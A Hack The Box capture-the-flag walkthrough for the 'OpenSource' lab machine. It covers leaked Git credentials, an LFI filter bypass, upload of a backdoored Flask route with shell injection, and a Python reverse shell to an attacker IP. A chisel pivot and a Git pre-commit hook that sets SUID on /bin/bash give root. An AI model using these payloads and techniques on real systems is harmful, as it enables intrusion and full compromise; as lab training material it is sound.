---
title: HTB - OpenSource
date: 2022-07-06
description: OpenSource Hack The Box Writeup/Walkthrough
tags: ["HTB", "ctf", "writeup", "Git", "Flask", "Docker", "LFI"]
categories: ["Hack the Box"]
summary: Opensource is an easy Linux machine from HTB. The initial enumeration is mostly done via Git and available web application source code. User foothold is gained via a LFI vulnerability, while privilege escalation consists of abusing Git's pre-commit hook.
---

Opensource is an easy Linux machine from HTB. The initial enumeration is mostly done via Git and available web application source code. User foothold is gained via a LFI vulnerability, while privilege escalation consists of abusing Git's pre-commit hook.

{{< badge >}}
New article!
{{< /badge >}}


![HTB_logo](/img/htb/opensource/logo.jpeg)


   Name | OpenSource
--------|------
    OS  | Linux
  Difficulty | Easy [20 points]

# Recon 
Nmap scan shows the following ports to be open:

````
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
````

Visiting the web app we are presented with an Upcloud service which permits to upload and transfer files for free. We are also able to download its source code:

![HTB_download](/img/htb/opensource/download.png)

From source we discover that:

- the app is built with **Flask**, a web framework written in Python
- there is a Dockerfile, meaning that the website is probably running in a docker container
- we have a git repo at our disposal to explore

Gobuster shows the `/console` endpoint to be available, but in order to use the funcionality a PIN is needed:

````bash
/download             (Status: 200) [Size: 2489147]
/console              (Status: 200) [Size: 1563]
````

![HTB_pin](/img/htb/opensource/pin.png)

There is an interesting post on Hack Tricks explaining how to generate a valid PIN for the Werkzeug Console:

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)

(I was able to retrieve all the informations for the exploit code, but the PIN I got was always flagged as incorrect). 

Having the source code at our disposal, we have to probably look there for possible flaws.

Useful informations in the source code:

- There are some credentials in one of the commits in the `dev` branch
- The application is vulnerable to **LFI** (Local File Inclusion) on the `/uploads` endpoint


### Credentials

Leveraging `git` we can enumerate the current repository.

`git branch` will show us that we have two branches, *dev* and *public*:

````bash
$ git branch                                                                                                   
  dev
* public
````


With `git log` we can list the version history for the current branch or for the *dev* one. 
To see log messages and textual diff for a commit we can use `git show commit_number`:

````
$ git log                                          
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
````

Checking for informations in the dev branch we discover some credentials:

````bash
$ git log dev

# we get a list of commits
````

````
$ git show be4da71987bbbc8fae7c961fb2de01ebd0be1997

...
...

-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
````

There are some credentials in the code --> `dev01:Soulless_Developer#2022`.

Trying the credentials against SSH gives no luck!

{{< alert >}}
**Note!** This credentials will be useful later when getting the user shell!
{{< /alert >}}


### LFI

Under `/app/app/utils.py` there is an interesting function that defines `get_file_name`, which is then used by `views.py`:  

````python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
````

The function is preventing `../` sequences from a file name by removing them, in order to protect against LFI attacks.

This filter is a very basic one and can be easily bypassed using double slashes `..//`. The filter will not recognize `..//` as a dangerous sequence and will not remove it from the file name.

For example it is possible to retrieve the target machine's MAC address with the following request:

````HTTP
GET /uploads/..//sys/class/net/eth0/address HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

# result is 02:42:ac:11:00:02
````

Or to access the `/etc/passwd` resource:

````HTTP
GET /uploads/..//etc/passwd HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
````

{{< lead >}}
-  But how can we leverage the LFI once we have access to the source code?
{{< /lead >}}
 
The `views.py` file contains the application routing definition:

> App Routing means mapping the URLs to a specific function that will handle the logic for that URL. 

We can customize this file and then upload it to the target in order to replace the original one. Our costome code will define a new route in the file that will give us a reverse shell on the web application.

There are different ways of achieving the goal. In this example we define a `/ventilator` route and a function that performs a lookup on a hostname supplied by the user. Since the hostname is simply appended to the command and executed on a subshell with `shell=True`, it will be possible to stack another command using `;` in the GET parameter to inject additional commands.

This following is the customized `views.py` file we'll upload:

````python
import os
import subprocess

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/ventilator')  # custom reverse shell function
def reverse():
    
    x = request.args.get('hostname')
    cmd = 'nslookup ' + x

    return subprocess.check_output(cmd, shell=True)

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

````

In order to abuse the LFI vulnerability we have to upload our custom `views.py` file , but intercepting the request to edit the file name.

`views.py`will become `..//app/app/views.py`, as we know from the source code that this is the original path where the file is located.

![HTB_shellUpload](/img/htb/opensource/shell_upload.png)

Now if we wisit the following URL `http://10.10.11.164/ventilator?hostname=x;cat%20/etc/passwd`, we will also see the content of `/etc/passwd`, confirming the reverse shell is working correctly:

![HTB_revShell](/img/htb/opensource/rev_shell.png)

&nbsp;

# User Shell

To obtain the reverse shell on our machine, we just need to append a command that will call black to a `nc` listener on our attacking machine (it is not possible to get any output from the reverse shell on the web page):

For example:

````bash
http://10.10.11.164/ventilator?hostname=x;export%20RHOST=%2210.10.16.37%22;export%20RPORT=4545;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27

# where 10.10.16.37 is the attacker machine's IP and port 4545 is the port where nc is listening
# the reverse shell was generated on https://www.revshells.com
````

We get access to the target from our attacking machine:

`````
$ nc -nlvp 4545
listening on [any] 4545 ...
connect to [10.10.16.37] from (UNKNOWN) [10.10.11.164] 43656
/app # hostname
hostname
013fa42e999f
/app # whoami 
whoami
root
/app #         
`````

And we can state we are in a docker container by giving a look at `/`:

````
/app # ls -als /
ls -als /
total 72
     4 drwxr-xr-x    1 root     root          4096 Jul  7 10:48 .
     4 drwxr-xr-x    1 root     root          4096 Jul  7 10:48 ..
     0 -rwxr-xr-x    1 root     root             0 Jul  7 10:48 .dockerenv
     8 drwxr-xr-x    1 root     root          4096 May  4 16:35 app
     4 drwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin
...
````

Our current IP inside the container is `172.17.0.7`:

````
/app # ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:650 errors:0 dropped:0 overruns:0 frame:0
          TX packets:606 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:63023 (61.5 KiB)  TX bytes:330100 (322.3 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
````

While `172.17.0.1`is the internal IP of the target machine:

````
/app # route   
route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
172.17.0.0      *               255.255.0.0     U     0      0        0 eth0
````

From inside the target machine it is now possible to enumerate port 3000 that was retruning as filtered from the initial nmap scan:

````
/app # nc 172.17.0.1 3000
nc 172.17.0.1 3000
id
id
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
````

There is probably a web application listening on that port!

In order to pivot from the container to the web application (and escape from the container), we can use *chisel*.

The target machine is running an AMD processor, so it is important to download that specific version: 

````
$ cat /proc/cpuinfo
...
processor       : 1
vendor_id       : AuthenticAMD
cpu family      : 23
model           : 49
model name      : AMD EPYC 7302P 16-Core Processor
...
````

On the attacking machine we start a chisel server:

````
$ chisel server -p 8000 --reverse
````

The `--reverse`switch, as 0xdf points out on his website:

> tells the server that I want clients connecting in to be allowed to define reverse tunnels. This means clients connecting in can open listening ports on my kali box. That is what I want here, but be aware of what you’re allowed it to do.

We also move chisel on the target and start the client:

````
/ # chmod +x chisel

/ # chisel client 10.10.16.37 R:3000:172.17.0.1:3000
````

After that we are able to access the Gitea web application listeing on port 3000 of target machine by visiting `localhost:3000`on our attacking machine:

![HTB_webAppChisel](/img/htb/opensource/webApp_chisel.png)

Login is successfull with the previously discovered credentials `dev01:Soulless_Developer#2022`.    
Once inside there is a repository named `home-backup`that contains SSH private keys for `dev01` user.

With that we can finally access the target machine via SSH as `dev01`:

````
$ ssh -i id_rsa.key dev01@10.10.11.164
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  6 14:58:51 UTC 2022

  System load:  0.04              Processes:              217
  Usage of /:   76.4% of 3.48GB   Users logged in:        0
  Memory usage: 25%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

dev01@opensource:~$ whoami
dev01
````

&nbsp;

# Privilege Escalation

Priv-esc is done looking at running processes on the machine.
We download `pspy64` on our Kali and pass it to the target:

````
wget http://10.10.16.37:4848/pspy .
````

 The tool performs some checks on the system without the need of having root permissions. Launch it:

````
dev01@opensource:~$ chmod +x pspy64                                                                                                                                                   
dev01@opensource:~$ ./pspy64                                                                                                                                                                   
````

The tool will show a list of running processes. For many of them it is used `UID 0`, meaning that those actions are performed with root permissions. 

In the list there is also a `git commit` command running approximately every minute:

![HTB_gitCommit](/img/htb/opensource/gitCommit.png)

This can be abused to priv-esc on the machine abusing the `pre-commit` hook!

> Git hooks are scripts that perform automated actions when a specific action is performed in the git client or command line. The git hook name usually indicates the hook’s trigger (e.g. pre-commit).
> Git hooks live under the .git folder of your repo in a directory called hooks. The path to the hooks will look similar to repo/.git/hooks.

Under `/home/dev01/.git/hooks` on the target machine there are different hooks with the `.sample` extension. In order to activate one of them we need to delete the extension or create one from scratch.

Let's create a new hook named `pre-commit`!. The file can contain a reverse shell (that combined with a `nc` listener on our machine will give us a root shell) or any other command that we can leverage to obtain privileged access on the machine. 

For example, the following command will set the SUID binary for `/bin/bash`, making it possible to run it with root permissions:

````bash
# content of pre-commit

chmod u+s /bin/bash
````

Make the file executable:

````
chmod +x pre-commit
````

After some time `/bin/bash` will have its permissions edited:

````
watch -n 2 ls -l /bin/bash
````

To get the root shell:

````
dev01@opensource:~/.git/hooks$ bash -p
bash-4.4# id
uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)
````
